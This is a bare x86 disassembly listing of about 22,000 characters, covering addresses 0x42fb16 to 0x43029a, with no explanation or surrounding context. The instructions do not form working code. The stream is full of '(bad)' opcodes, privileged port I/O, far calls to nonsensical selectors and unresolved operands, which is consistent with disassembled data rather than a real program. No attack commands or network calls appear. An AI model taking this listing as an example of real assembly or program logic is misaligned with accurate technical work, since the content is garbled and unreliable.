  42fb16:	xchg   edi,eax
  42fb17:	das    
  42fb18:	jo     0x42fac3
  42fb1a:	pusha  
  42fb1b:	add    eax,0x6ada0b6a
  42fb20:	push   ds
  42fb21:	(bad)  
  42fb22:	ret    0x22d5
  42fb25:	les    esp,FWORD PTR [ebp-0x5e]
  42fb28:	fincstp 
  42fb2a:	imul   edx,DWORD PTR [ecx],0x329f4f89
  42fb30:	or     cl,0xe4
  42fb33:	in     eax,0xf9
  42fb35:	adc    al,0x30
  42fb37:	pop    edx
  42fb38:	fdivr  DWORD PTR [edx+0x7e]
  42fb3b:	push   ebp
  42fb3c:	test   DWORD PTR [eax-0x4d],ebx
  42fb3f:	pop    esp
  42fb40:	outs   dx,BYTE PTR ds:[esi]
  42fb41:	and    BYTE PTR [ecx+0x2d],ah
  42fb44:	ds inc esp
  42fb46:	add    al,0x6c
  42fb48:	mov    eax,0x2210e72d
  42fb4d:	adc    al,0xe8
  42fb4f:	mov    esp,0xf4e183cd
  42fb54:	repz mov al,ds:0xbf89ebf9
  42fb5a:	aad    0x11
  42fb5c:	xchg   ecx,eax
  42fb5d:	push   eax
  42fb5e:	push   ss
  42fb5f:	inc    esp
  42fb60:	jl     0x42fb55
  42fb62:	fwait
  42fb63:	aad    0x6e
  42fb65:	or     BYTE PTR [esi],al
  42fb67:	mov    ebx,0xecfd3779
  42fb6c:	mov    ch,ch
  42fb6e:	scas   al,BYTE PTR es:[edi]
  42fb6f:	fld    QWORD PTR [esi+eax*1]
  42fb72:	cld    
  42fb73:	sbb    bl,BYTE PTR [eax+0x4f]
  42fb76:	repz aam 0xdd
  42fb79:	lock or ecx,DWORD PTR [ebx+edx*4-0x77c2d3c8]
  42fb81:	ja     0x42fb16
  42fb83:	push   ss
  42fb84:	(bad)  
  42fb86:	test   al,0xe6
  42fb88:	lock in eax,dx
  42fb8a:	dec    edx
  42fb8b:	scas   al,BYTE PTR es:[edi]
  42fb8c:	mov    ecx,0xb74f3f05
  42fb91:	add    eax,0x76ac1947
  42fb96:	pop    ds
  42fb97:	std    
  42fb98:	popa   
  42fb99:	fimul  DWORD PTR [bp+si-0x2b2c]
  42fb9e:	fst    st(4)
  42fba0:	idiv   BYTE PTR [ebx-0x52]
  42fba3:	cmp    DWORD PTR [edi-0x1d],0x3bb4de9c
  42fbaa:	loop   0x42fbb5
  42fbac:	mov    esi,edx
  42fbae:	push   esi
  42fbaf:	sub    esi,DWORD PTR [ebx+0x5b5da60e]
  42fbb5:	repnz pusha 
  42fbb7:	mov    ecx,0x8ca74c15
  42fbbc:	cdq    
  42fbbd:	xor    ebx,DWORD PTR [ebx+0x43]
  42fbc0:	adc    ecx,DWORD PTR [edi+0x6f88802b]
  42fbc6:	int3   
  42fbc7:	std    
  42fbc8:	out    dx,al
  42fbc9:	stos   DWORD PTR es:[edi],eax
  42fbca:	out    0x98,eax
  42fbcc:	xchg   ebp,eax
  42fbcd:	jecxz  0x42fc3c
  42fbcf:	aam    0xb
  42fbd1:	and    DWORD PTR [ecx-0x536916e8],eax
  42fbd7:	xor    esi,DWORD PTR [edi+0x2f8560a8]
  42fbdd:	mov    DWORD PTR [eax-0x35fd6561],edx
  42fbe3:	inc    edx
  42fbe4:	lahf   
  42fbe5:	cmp    dl,BYTE PTR [ebp-0x63]
  42fbe8:	das    
  42fbe9:	push   es
  42fbea:	pusha  
  42fbeb:	push   ecx
  42fbec:	xlat   BYTE PTR ds:[ebx]
  42fbed:	xor    BYTE PTR [eax],ah
  42fbef:	in     al,0x22
  42fbf1:	cli    
  42fbf2:	mov    BYTE PTR [edi-0x2eeb33ee],bl
  42fbf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbf9:	(bad)  
  42fbfa:	pop    ebx
  42fbfb:	adc    BYTE PTR [ebp+eax*8+0x1f88049a],al
  42fc02:	in     al,0xdf
  42fc04:	sub    bl,BYTE PTR [edi+0x7122f1]
  42fc0a:	jl     0x42fc0c
  42fc0c:	mov    ebp,DWORD PTR [ecx+0x1a]
  42fc0f:	out    dx,eax
  42fc10:	push   ecx
  42fc11:	mov    edx,0x3f8e6b3c
  42fc16:	in     al,0x63
  42fc18:	dec    edx
  42fc19:	mov    ecx,0xafb6727
  42fc1e:	adc    eax,DWORD PTR [edi]
  42fc20:	mov    DWORD PTR [edx+0x56],esi
  42fc23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fc24:	cmp    al,0x2
  42fc26:	mov    ecx,0xaa636ae9
  42fc2b:	mov    cs,WORD PTR [esi-0x3be05821]
  42fc31:	in     eax,dx
  42fc32:	sbb    eax,eax
  42fc34:	(bad)  
  42fc35:	lahf   
  42fc36:	fist   DWORD PTR [ebp-0x56]
  42fc39:	gs or  edx,edi
  42fc3c:	fwait
  42fc3d:	dec    DWORD PTR [esi+0x27]
  42fc40:	(bad)  
  42fc41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fc42:	dec    edi
  42fc43:	test   eax,0x451f426d
  42fc48:	vdivsd xmm7,xmm5,QWORD PTR [esi]
  42fc4c:	push   es
  42fc4d:	and    eax,0x6a31d427
  42fc52:	not    BYTE PTR [edi]
  42fc54:	retf   
  42fc55:	mov    ebp,DWORD PTR [edi-0x7e243aa0]
  42fc5b:	cmp    eax,0xc1ae0d89
  42fc60:	sbb    dl,bh
  42fc62:	sahf   
  42fc63:	xlat   BYTE PTR ds:[ebx]
  42fc64:	mov    ebx,0xf2dd022b
  42fc69:	xchg   ecx,eax
  42fc6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fc6b:	xor    eax,0x4b1f8a94
  42fc70:	inc    ebx
  42fc71:	pop    ss
  42fc72:	cld    
  42fc73:	mov    edx,0xaa726120
  42fc78:	xchg   ebp,eax
  42fc79:	das    
  42fc7a:	push   cs
  42fc7b:	adc    DWORD PTR [eax],esi
  42fc7d:	arpl   di,di
  42fc7f:	arpl   WORD PTR [ecx-0x5edce026],di
  42fc85:	out    dx,eax
  42fc86:	popa   
  42fc87:	mov    esp,0xd59afe02
  42fc8c:	push   edi
  42fc8d:	dec    edx
  42fc8e:	or     edi,0xb24399b6
  42fc94:	mov    DWORD PTR [edi],esp
  42fc96:	rcl    BYTE PTR [ebx],1
  42fc98:	cwde   
  42fc99:	repnz mov dl,0x57
  42fc9c:	lods   al,BYTE PTR ds:[esi]
  42fc9d:	add    eax,0xe4ff27fc
  42fca2:	mov    WORD PTR [esi],cs
  42fca4:	cmp    eax,0x88a00bd6
  42fca9:	test   DWORD PTR [ecx],edx
  42fcab:	mov    edi,0xaa7a0560
  42fcb0:	push   ss
  42fcb1:	inc    esi
  42fcb2:	out    0x1d,al
  42fcb4:	inc    edx
  42fcb5:	sahf   
  42fcb6:	nop
  42fcb7:	mul    DWORD PTR [eax-0x62]
  42fcba:	lahf   
  42fcbb:	dec    ebx
  42fcbc:	jae    0x42fd1d
  42fcbe:	pop    ds
  42fcbf:	daa    
  42fcc0:	jecxz  0x42fc69
  42fcc2:	js     0x42fd0f
  42fcc4:	cs (bad) 
  42fcc6:	paddq  mm1,QWORD PTR ds:0x282b9fd5
  42fccd:	fadd   DWORD PTR [esi+0x70]
  42fcd0:	and    BYTE PTR [ecx+0x488a755e],0x1e
  42fcd7:	and    BYTE PTR [esi+0x2a],dl
  42fcda:	(bad)  
  42fcdb:	int    0x1e
  42fcdd:	add    dl,BYTE PTR [eax-0x376f610b]
  42fce3:	loop   0x42fce6
  42fce5:	lds    esp,FWORD PTR [eax+0x67]
  42fce8:	push   es
  42fce9:	add    DWORD PTR [ecx],0xffffffaf
  42fcec:	pop    esi
  42fced:	shl    ah,1
  42fcef:	aad    0x55
  42fcf1:	xchg   edx,eax
  42fcf2:	pusha  
  42fcf3:	loopne 0x42fd06
  42fcf5:	mov    cl,0x6d
  42fcf7:	dec    ebx
  42fcf8:	mov    ch,dl
  42fcfa:	mov    ch,0x87
  42fcfc:	dec    esp
  42fcfd:	jne    0x42fcb0
  42fcff:	jmp    0x302:0x51f63e19
  42fd06:	and    ch,BYTE PTR [ebx-0x240a7cfc]
  42fd0c:	mov    edi,edi
  42fd0e:	(bad)  
  42fd0f:	js     0x42fd63
  42fd11:	mov    eax,ds:0x274bc9f4
  42fd16:	xor    bl,bh
  42fd18:	push   edi
  42fd19:	in     eax,0x5f
  42fd1b:	shl    BYTE PTR [bp+di-0x6d],0x54
  42fd20:	jne    0x42fd66
  42fd22:	ss ins DWORD PTR es:[edi],dx
  42fd24:	mov    DWORD PTR [ebx-0x6126bcb4],esp
  42fd2a:	add    ch,BYTE PTR [ecx-0x1ead2e20]
  42fd30:	sbb    DWORD PTR [ebx],eax
  42fd32:	push   0x70
  42fd34:	pop    esi
  42fd35:	pop    esp
  42fd36:	inc    esi
  42fd37:	add    ebp,DWORD PTR [ebx+edi*8-0x5d266a0]
  42fd3e:	stos   DWORD PTR es:[edi],eax
  42fd3f:	retf   0x5e32
  42fd42:	mov    al,0xaf
  42fd44:	mov    dh,0xe6
  42fd46:	(bad)  
  42fd47:	xor    al,dh
  42fd49:	or     al,0x66
  42fd4b:	mov    ebp,0xf41f9f0a
  42fd50:	fs xor al,0xff
  42fd53:	stos   BYTE PTR es:[edi],al
  42fd54:	jo     0x42fd4b
  42fd56:	(bad)  
  42fd57:	mov    ecx,0xce150377
  42fd5c:	mov    bl,0x15
  42fd5e:	(bad)  
  42fd5f:	ins    BYTE PTR es:[edi],dx
  42fd60:	mov    ecx,eax
  42fd62:	mov    ch,0x99
  42fd64:	sahf   
  42fd65:	popf   
  42fd66:	lea    edx,[ebp-0x2d0afb3a]
  42fd6c:	(bad)  
  42fd6d:	fadd   DWORD PTR [ecx+0x6]
  42fd70:	jns    0x42fdea
  42fd72:	das    
  42fd73:	sbb    eax,edx
  42fd75:	jbe    0x42fdda
  42fd77:	pop    ebp
  42fd78:	aam    0x6
  42fd7a:	inc    esi
  42fd7b:	cmp    BYTE PTR [ebx+0x1c],ah
  42fd7e:	daa    
  42fd7f:	dec    ebx
  42fd80:	add    al,0x45
  42fd82:	dec    DWORD PTR ds:0x9e1e52d0
  42fd88:	into   
  42fd89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd8a:	clc    
  42fd8b:	push   esp
  42fd8c:	sbb    al,BYTE PTR [edi+0x7a002914]
  42fd92:	inc    esp
  42fd93:	cmc    
  42fd94:	gs dec ecx
  42fd96:	pop    ds
  42fd97:	push   ebp
  42fd98:	fwait
  42fd99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd9a:	popa   
  42fd9b:	dec    eax
  42fd9c:	das    
  42fd9d:	add    ecx,eax
  42fd9f:	ja     0x42fe0a
  42fda1:	pusha  
  42fda2:	mov    edi,0x600ddf35
  42fda7:	daa    
  42fda8:	fcomip st,st(0)
  42fdaa:	cs fs inc esi
  42fdad:	or     esi,0x5eececaa
  42fdb3:	dec    edx
  42fdb4:	shl    ebp,0xf6
  42fdb7:	aam    0xac
  42fdb9:	mov    cl,0x6e
  42fdbb:	mov    ebp,0x72ebdda4
  42fdc0:	mov    ah,0xfa
  42fdc2:	xlat   BYTE PTR ds:[ebx]
  42fdc4:	ins    DWORD PTR es:[edi],dx
  42fdc5:	sbb    bh,0xc
  42fdc8:	test   al,0x18
  42fdca:	inc    eax
  42fdcb:	sahf   
  42fdcc:	les    ebx,FWORD PTR [edi]
  42fdce:	loope  0x42fda5
  42fdd0:	jmp    FWORD PTR [esi]
  42fdd2:	data16 hlt 
  42fdd4:	jnp    0x42fd7d
  42fdd6:	aas    
  42fdd7:	in     eax,dx
  42fdd8:	mov    DWORD PTR [ebp+0x31],ebp
  42fddb:	fld    QWORD PTR [eax-0x51207003]
  42fde1:	adc    al,0xee
  42fde3:	ret    
  42fde4:	fwait
  42fde5:	pop    esi
  42fde6:	enter  0x65b5,0xa7
  42fdea:	call   0x2011:0x581388eb
  42fdf1:	dec    esp
  42fdf2:	mov    esp,0x5217a57b
  42fdf7:	mov    dh,0x2a
  42fdf9:	xchg   ebx,eax
  42fdfa:	cs aaa 
  42fdfc:	div    BYTE PTR [eax+0x62]
  42fdff:	push   edx
  42fe00:	mov    dh,BYTE PTR [ebx]
  42fe02:	lahf   
  42fe03:	mov    ebx,0xb343df07
  42fe08:	xor    DWORD PTR [ebx-0x8],eax
  42fe0b:	pop    ecx
  42fe0c:	jno    0x42fdd3
  42fe0e:	push   ss
  42fe0f:	(bad)  [edi-0x395017fe]
  42fe15:	mov    bl,0xc6
  42fe17:	std    
  42fe18:	push   cs
  42fe19:	call   0xad0f:0xb9fa495d
  42fe20:	gs cmp al,0xcf
  42fe23:	std    
  42fe24:	xor    al,0xb2
  42fe26:	jp     0x42fdde
  42fe28:	xchg   esp,eax
  42fe29:	add    ch,BYTE PTR [eax+0x3c]
  42fe2c:	test   eax,0x4582d8e2
  42fe31:	adc    BYTE PTR [ebp+eax*4-0x2b],ah
  42fe35:	sbb    ebp,DWORD PTR [esi-0xd]
  42fe38:	dec    esp
  42fe39:	inc    edx
  42fe3a:	ret    
  42fe3b:	mov    eax,ds:0x9e920385
  42fe40:	mov    ch,0xfa
  42fe42:	mov    ?,WORD PTR [ebx]
  42fe44:	dec    esi
  42fe45:	inc    edx
  42fe46:	inc    esi
  42fe47:	mov    BYTE PTR [esi+0x5e577e99],cl
  42fe4d:	out    0xe9,eax
  42fe4f:	add    al,0xd7
  42fe51:	xchg   ecx,eax
  42fe52:	and    BYTE PTR [eax-0x18],al
  42fe55:	stc    
  42fe56:	bound  esp,QWORD PTR [edi+0x1d475194]
  42fe5c:	push   0xffffffb2
  42fe5e:	inc    edx
  42fe5f:	arpl   WORD PTR [edx-0x24f812e9],ax
  42fe65:	xor    al,0x1e
  42fe67:	or     bh,BYTE PTR [ebx+0x48]
  42fe6a:	loopne 0x42fe30
  42fe6c:	aaa    
  42fe6d:	sbb    al,0xd2
  42fe6f:	icebp  
  42fe70:	inc    edi
  42fe71:	push   es
  42fe72:	clc    
  42fe73:	cmp    BYTE PTR [ecx+0x67],bh
  42fe76:	test   eax,0xc107894a
  42fe7b:	pushf  
  42fe7c:	sub    BYTE PTR [edx-0x1cbf1f89],bl
  42fe82:	adc    eax,0xa47395d4
  42fe87:	push   ecx
  42fe88:	repz adc DWORD PTR [esi],ebp
  42fe8b:	dec    edi
  42fe8c:	mov    cl,ch
  42fe8e:	pop    ds
  42fe8f:	ror    BYTE PTR ds:[ecx],0x52
  42fe93:	mov    esp,0x4bfe05a1
  42fe98:	or     DWORD PTR [esp+ebp*4],esi
  42fe9b:	fstp   TBYTE PTR [esi]
  42fe9d:	iret   
  42fe9e:	outs   dx,BYTE PTR ds:[esi]
  42fe9f:	iret   
  42fea0:	ret    
  42fea1:	fnsave [esi-0x46d0f76e]
  42fea7:	cs (bad) 
  42fea9:	cs mov esi,0x3bbde896
  42feaf:	cdq    
  42feb0:	inc    esi
  42feb1:	cmp    DWORD PTR [edi+esi*2+0x5d06dc03],0xffffffb7
  42feb9:	mov    eax,ds:0xd081df7
  42febe:	shr    ch,0xda
  42fec1:	xor    BYTE PTR [edx+0x644983f0],dl
  42fec7:	cli    
  42fec8:	mov    ah,0x70
  42feca:	push   ds
  42fecb:	push   cs
  42fecc:	jp     0x42febd
  42fece:	adc    dl,ch
  42fed0:	(bad)  
  42fed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fed2:	pop    esp
  42fed3:	xchg   ecx,eax
  42fed4:	out    dx,eax
  42fed5:	hlt    
  42fed6:	popa   
  42fed7:	out    dx,al
  42fed8:	mov    dl,0xd
  42feda:	xchg   DWORD PTR [eax],ebp
  42fedc:	inc    eax
  42fedd:	mov    edi,0x5d8ed719
  42fee2:	fidiv  DWORD PTR gs:[ecx+0x6315e715]
  42fee9:	pop    esp
  42feea:	push   ds
  42feeb:	pop    ecx
  42feec:	cli    
  42feed:	cmp    eax,0x546091cb
  42fef2:	int    0xd6
  42fef4:	repz and BYTE PTR [esp+eiz*2-0x3a3f28e],al
  42fefc:	sbb    eax,esi
  42fefe:	pop    ds
  42feff:	sbb    eax,0x46c6858a
  42ff04:	push   0x32
  42ff06:	xor    bh,dl
  42ff08:	imul   edx,ecx,0x50a704fb
  42ff0e:	jecxz  0x42ff41
  42ff10:	xchg   ebp,eax
  42ff11:	pop    ds
  42ff12:	xchg   BYTE PTR [eax+0x62],bh
  42ff15:	add    ecx,0xffffffe3
  42ff18:	jo     0x42ff20
  42ff1a:	gs (bad) 
  42ff1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ff1d:	or     esi,ecx
  42ff1f:	mov    edx,DWORD PTR [esi+0x5255a546]
  42ff25:	xor    ebx,DWORD PTR [esi]
  42ff27:	popf   
  42ff28:	sub    DWORD PTR [esi-0x3b964668],esp
  42ff2e:	lahf   
  42ff2f:	and    al,0x11
  42ff31:	xlat   BYTE PTR ds:[ebx]
  42ff32:	pusha  
  42ff33:	and    ebp,esi
  42ff35:	popf   
  42ff36:	imul   ebp,DWORD PTR [edx-0x1aed34fa],0x59
  42ff3d:	xlat   BYTE PTR ds:[ebx]
  42ff3e:	or     ch,cl
  42ff40:	mov    BYTE PTR [edi+0x6dcf6b7f],ah
  42ff46:	fwait
  42ff47:	sbb    eax,0x5ec203be
  42ff4c:	fld    TBYTE PTR [ebx+0x66]
  42ff4f:	in     al,0x4d
  42ff51:	arpl   ax,dx
  42ff53:	jne    0x42fedd
  42ff55:	repz cli 
  42ff57:	push   ds
  42ff58:	out    dx,al
  42ff59:	out    dx,eax
  42ff5a:	aas    
  42ff5b:	mov    ebp,0xdda00323
  42ff60:	adc    DWORD PTR [edi+0x1d],ecx
  42ff63:	mov    DWORD PTR [edi+0x278360bf],esi
  42ff69:	pop    ss
  42ff6a:	mov    ecx,0xe9c0494
  42ff6f:	int3   
  42ff70:	rol    BYTE PTR ds:0xf6fc2b42,0xbf
  42ff77:	int    0xce
  42ff79:	xchg   ecx,eax
  42ff7a:	pusha  
  42ff7b:	cmc    
  42ff7c:	pop    ebp
  42ff7d:	sbb    DWORD PTR [edi-0xd],edi
  42ff80:	mov    ecx,?
  42ff82:	call   0x4cb3:0xde063dba
  42ff89:	out    0x9b,al
  42ff8b:	inc    ebp
  42ff8c:	or     DWORD PTR [edi],esi
  42ff8e:	test   al,0xce
  42ff90:	mov    BYTE PTR [edi+0xf],bl
  42ff93:	adc    ecx,ebp
  42ff95:	cdq    
  42ff96:	xor    al,0x4a
  42ff98:	call   0xdae7:0x190b0800
  42ff9f:	daa    
  42ffa0:	mov    al,0x9f
  42ffa2:	ud0    edi,DWORD PTR [eax-0x68524634]
  42ffa9:	ins    DWORD PTR es:[edi],dx
  42ffaa:	and    al,0x52
  42ffac:	imul   eax,ebx,0x13
  42ffaf:	jecxz  0x42ff8d
  42ffb1:	stos   DWORD PTR es:[edi],eax
  42ffb2:	sbb    al,0xd4
  42ffb4:	nop
  42ffb5:	mov    ebp,0x620dd1ce
  42ffba:	push   ds
  42ffbb:	mov    edi,?
  42ffbd:	popf   
  42ffbe:	cmp    BYTE PTR [eax+eax*2+0x2],dh
  42ffc2:	not    DWORD PTR [ecx+0x5ec0281]
  42ffc8:	mov    eax,0x1223fc6b
  42ffcd:	xchg   DWORD PTR [edi],ebx
  42ffcf:	scas   eax,DWORD PTR es:[edi]
  42ffd0:	fisttp WORD PTR [edx-0x59]
  42ffd3:	sbb    eax,0xc83736fd
  42ffd8:	cs add eax,esi
  42ffdb:	mov    dl,0x6e
  42ffdd:	dec    ecx
  42ffde:	inc    edi
  42ffdf:	mov    ah,0x6
  42ffe1:	dec    esp
  42ffe2:	pop    ds
  42ffe3:	xchg   ebx,eax
  42ffe4:	sbb    BYTE PTR [edi],0x5a
  42ffe7:	or     ecx,esp
  42ffe9:	enter  0xd44d,0x5d
  42ffed:	(bad)  
  42ffee:	in     eax,0xd2
  42fff0:	(bad)  
  42fff1:	clc    
  42fff2:	cdq    
  42fff3:	pop    esp
  42fff4:	repnz add al,BYTE PTR [edx+0x74ec80c6]
  42fffb:	les    esi,FWORD PTR [esi]
  42fffd:	dec    ecx
  42fffe:	mov    BYTE PTR [edx+0xcee02b8],cl
  430004:	dec    BYTE PTR [edx+0x3188a2e9]
  43000a:	cmp    al,0x89
  43000c:	push   ss
  43000d:	in     eax,0xed
  43000f:	fidivr DWORD PTR [eax-0x7d2b201d]
  430015:	push   ebx
  430016:	and    BYTE PTR [ebp+0x2c80a0e4],al
  43001c:	mov    DWORD PTR [edi-0x4d],esp
  43001f:	jmp    0xe3e14177
  430024:	loop   0x43008b
  430026:	gs enter 0x5fc,0x96
  43002b:	xor    esp,edi
  43002d:	inc    edx
  43002e:	dec    ecx
  43002f:	sub    BYTE PTR [ebp-0xc],0x68
  430033:	test   eax,0xe96e34bb
  430038:	or     DWORD PTR [ebp-0x1f],ebp
  43003b:	lods   eax,DWORD PTR ds:[esi]
  43003c:	push   ebx
  43003d:	add    al,dh
  43003f:	cmp    dl,dl
  430041:	jmp    0x7b1f:0x59b330c1
  430048:	jo     0x430003
  43004a:	jmp    DWORD PTR [ebp-0x2bb2014a]
  430050:	adc    esi,edi
  430052:	xor    BYTE PTR [edi],ah
  430054:	ror    eax,1
  430056:	loopne 0x43004d
  430058:	sub    BYTE PTR [edi],0xcb
  43005b:	or     al,BYTE PTR [ebp+0x31]
  43005e:	sahf   
  43005f:	stos   BYTE PTR es:[edi],al
  430060:	mov    cl,0xb
  430062:	fwait
  430063:	rol    BYTE PTR [edi+0x2],0x54
  430067:	or     DWORD PTR [edi+edx*1+0xd2acbcc],edi
  43006e:	pop    ds
  43006f:	pop    edi
  430070:	sti    
  430071:	unpcklps xmm3,xmm6
  430074:	in     al,dx
  430075:	dec    esp
  430076:	shl    ecx,1
  430078:	push   es
  430079:	jecxz  0x4300c9
  43007b:	aam    0x8f
  43007d:	mov    eax,0x7feace25
  430082:	push   ecx
  430083:	ins    BYTE PTR es:[edi],dx
  430084:	clc    
  430085:	or     edx,ebx
  430087:	fisttp DWORD PTR [ecx+0x19801159]
  43008d:	test   BYTE PTR [ecx-0x1ffddeed],ch
  430093:	mov    DWORD PTR [edi-0x7d410adf],eax
  430099:	mov    ds:0xef6fcb5e,al
  43009e:	lahf   
  43009f:	xchg   edi,eax
  4300a0:	jno    0x430056
  4300a2:	xchg   ebx,eax
  4300a3:	call   0xd9c5:0x2f0e0272
  4300aa:	adc    dl,dl
  4300ac:	sub    DWORD PTR [edx],ebx
  4300ae:	pushf  
  4300af:	test   eax,0x299cfc47
  4300b4:	adc    al,0x4a
  4300b6:	scas   eax,DWORD PTR es:[edi]
  4300b7:	daa    
  4300b8:	call   0xff1c:0x4aabe6f
  4300bf:	adc    DWORD PTR [ebp+edi*4-0x36b12a90],ebx
  4300c6:	pop    eax
  4300c7:	mov    di,WORD PTR [ebp+esi*4-0x176077a2]
  4300cf:	call   0xde22edd6
  4300d4:	mov    esp,0x51055602
  4300d9:	and    BYTE PTR [edi+0x1fd6c761],0x1d
  4300e0:	lock cmc 
  4300e2:	js     0x43009e
  4300e4:	pop    edx
  4300e5:	push   ebx
  4300e6:	pop    esp
  4300e7:	aam    0x58
  4300e9:	and    dh,bl
  4300eb:	adc    bh,BYTE PTR [esi+edx*4]
  4300ee:	mov    DWORD PTR [edx-0x77],ecx
  4300f1:	(bad)  
  4300f2:	jnp    0x43010a
  4300f4:	ret    0xb88d
  4300f7:	fwait
  4300f8:	adc    eax,0x8c7bdc03
  4300fd:	cmp    bl,BYTE PTR [eax-0xc]
  430100:	jle    0x4300f7
  430102:	jle    0x430183
  430104:	jmp    0x578:0x549472f6
  43010b:	sbb    esp,ecx
  43010d:	add    bl,ah
  43010f:	mov    ds:0xaa2c9710,eax
  430114:	leave  
  430115:	and    al,0x7d
  430117:	int    0xeb
  430119:	out    0x9f,eax
  43011b:	adc    al,bl
  43011d:	fisubr WORD PTR [ebx-0x73875f4c]
  430123:	aam    0x62
  430125:	mov    bh,0x35
  430127:	push   edx
  430128:	cwde   
  430129:	ret    
  43012a:	and    eax,0xb4118f5b
  43012f:	and    bh,BYTE PTR [ecx+0x2aa480aa]
  430135:	dec    eax
  430136:	(bad)
  430139:	retf   
  43013a:	sbb    cl,BYTE PTR [edi]
  43013c:	les    ebp,FWORD PTR [ebx]
  43013e:	push   ecx
  43013f:	mov    cs,WORD PTR [eax-0x2f431ff]
  430145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430147:	fwait
  430148:	push   esp
  430149:	add    al,BYTE PTR [esi]
  43014b:	arpl   WORD PTR [esi-0x5b],si
  43014e:	fisubr WORD PTR [ecx-0x78e06427]
  430154:	push   eax
  430155:	out    dx,eax
  430156:	imul   ebp,ebx,0xd46ecabc
  43015c:	mov    BYTE PTR [esi-0x13],dh
  43015f:	mov    ds:0xe38a5ae,al
  430164:	inc    esp
  430165:	scas   eax,DWORD PTR es:[edi]
  430166:	pop    ds
  430167:	out    dx,eax
  430168:	ret    
  430169:	push   ebp
  43016a:	pop    edx
  43016b:	mov    esi,0xecf4b39a
  430170:	repnz add ch,BYTE PTR [esi+edx*4]
  430174:	mov    edx,DWORD PTR [esi-0x7ae51ac0]
  43017a:	pop    ds
  43017b:	pop    ebp
  43017c:	xor    BYTE PTR [esi-0x6305a815],al
  430182:	(bad)  
  430183:	aam    0xe0
  430185:	pushf  
  430186:	imul   ecx,DWORD PTR [edx],0x629a478a
  43018c:	lahf   
  43018d:	inc    ecx
  43018e:	mov    ds:0x433f0214,ax
  430194:	shl    BYTE PTR [eax-0x38],cl
  430197:	stos   DWORD PTR es:[edi],eax
  430198:	mov    al,ds:0x2aead9f5
  43019d:	jecxz  0x430154
  43019f:	sbb    bl,BYTE PTR [ecx]
  4301a1:	inc    esp
  4301a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4301a3:	jae    0x43014f
  4301a5:	push   ebx
  4301a6:	pop    ds
  4301a7:	out    0xb1,eax
  4301a9:	jecxz  0x4301ac
  4301ab:	adc    ecx,0xda7d9e44
  4301b1:	pushf  
  4301b2:	fldcw  WORD PTR [eax]
  4301b4:	jne    0x4301b7
  4301b6:	push   ds
  4301b7:	popf   
  4301b8:	pop    ds
  4301b9:	mov    bh,0xd4
  4301bb:	xor    eax,0x10b8149a
  4301c0:	stos   DWORD PTR es:[edi],eax
  4301c1:	add    eax,0x96aaedee
  4301c6:	and    BYTE PTR [eax+0xd7b73b3],ah
  4301cc:	adc    edi,DWORD PTR [edi+0x6c89d4ed]
  4301d2:	pop    DWORD PTR [edi-0x57dfa15]
  4301d8:	cld    
  4301d9:	push   ecx
  4301da:	outs   dx,BYTE PTR ds:[esi]
  4301db:	mov    eax,ds:0x5d60b986
  4301e0:	fs in  eax,0x90
  4301e3:	ds inc edi
  4301e5:	bound  edx,QWORD PTR [eax]
  4301e7:	fcomp  QWORD PTR [eax]
  4301e9:	add    cl,BYTE PTR [ebp+eiz*1+0x7629ec69]
  4301f0:	inc    eax
  4301f1:	stos   BYTE PTR es:[di],al
  4301f3:	cmp    eax,0x4760d261
  4301f8:	enter  0xf475,0x76
  4301fc:	xor    BYTE PTR [edx],al
  4301fe:	in     al,0x25
  430200:	lods   eax,DWORD PTR ds:[esi]
  430201:	push   edi
  430202:	(bad)  fs:[eax+0x2f]
  430206:	stos   DWORD PTR es:[edi],eax
  430207:	dec    ecx
  430208:	ret    0x62e8
  43020b:	repz xlat BYTE PTR ds:[ebx]
  43020d:	inc    esi
  43020e:	pop    ebp
  43020f:	push   eax
  430210:	dec    eax
  430211:	add    al,0x44
  430213:	aad    0x8a
  430215:	mov    dh,0x25
  430217:	ja     0x4301b7
  430219:	inc    ebx
  43021b:	stos   DWORD PTR es:[edi],eax
  43021c:	mov    ebp,ebx
  43021e:	js     0x430218
  430220:	jge    0x43023c
  430222:	push   ebx
  430223:	push   esp
  430224:	xchg   edi,eax
  430225:	dec    edx
  430226:	lods   al,BYTE PTR ds:[esi]
  430227:	xchg   ecx,eax
  430228:	mov    gs,WORD PTR [ecx]
  43022a:	scas   eax,DWORD PTR es:[edi]
  43022b:	mov    BYTE PTR [ecx+0x63b78069],cl
  430231:	jp     0x430251
  430233:	jne    0x43029f
  430235:	cmp    esp,DWORD PTR [ecx-0x678ea31c]
  43023b:	mov    edx,0x2d042da
  430240:	or     DWORD PTR [ecx+0x74],edi
  430243:	cld    
  430244:	ins    DWORD PTR es:[edi],dx
  430245:	xlat   BYTE PTR ds:[ebx]
  430246:	pop    ds
  430247:	jno    0x4302bb
  430249:	dec    edi
  43024a:	pop    ebp
  43024b:	aaa    
  43024c:	mov    ah,al
  43024e:	adc    eax,0xc311a699
  430253:	push   esp
  430254:	retf   
  430255:	test   DWORD PTR [eax+0x1e26a861],edx
  43025b:	arpl   WORD PTR [ebx+0x4ae3b606],si
  430261:	add    eax,0x29f39a10
  430266:	addr16 push edi
  430268:	dec    esp
  430269:	loopne 0x4301ff
  43026b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43026c:	jmp    0x56d7:0xaf03e6aa
  430273:	jge    0x430204
  430275:	jno    0x4302b5
  430277:	mov    edx,0x46c73249
  43027c:	je     0x4302c7
  43027e:	xchg   edx,eax
  43027f:	push   cs
  430280:	cmp    eax,0x954a5ca
  430285:	mov    bh,0x2a
  430287:	adc    BYTE PTR [esi+0x11],dh
  43028a:	pop    ds
  43028b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43028c:	out    0x9c,eax
  43028e:	pop    es
  43028f:	(bad)
  430293:	aad    0x59
  430295:	jmp    0x5271c1f5
  43029a:	(bad)  
